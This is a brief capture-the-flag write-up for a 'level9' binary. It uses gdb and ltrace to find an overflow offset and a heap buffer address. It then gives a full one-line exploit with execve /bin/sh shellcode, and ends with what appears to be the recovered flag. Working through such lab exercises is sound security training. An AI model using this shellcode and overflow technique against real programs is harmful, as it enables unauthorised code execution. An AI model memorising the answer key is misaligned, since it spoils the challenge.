```
run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.

0x08048682 in main ()
```

  
```
> info register eax
> eax 0x41366441 1094083649 -> 108 offset
```
  

```
> disass main
[...]
0x08048677 <+131>: call 0x804870e <_ZN1N13setAnnotationEPc>
0x0804867c <+136>: mov 0x10(%esp),%eax
[...]

> b *main+136 # Just after setAnnotation
> run 'AAAA'
> x $eax
0x0804a00c: 0x41414141
addr_shell (4) + shellcode (23) + padding (81) + buffer_addr (4)
112
```
  

```
addresse_shell_code = memcpy + 0x04

> ltrace ./level9 "AAAA"
memcpy(0x0804a00c, "AAAA", 4) = 0x0804a00c

> gdb
> disas 0x804870e
0x08048738 <+42>: leave
> b *0x08048738
> run AAAA
0x804a00c: 0x41414141 0x00000000 0x00000000 0x00000000
^^^^^^^^^^

addresse_shell_code = 0x804a00c +0x04 = 0x804A010
```

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A" * 59 + "\x0c\xa0\x04\x08"')
```

[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)  

`f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
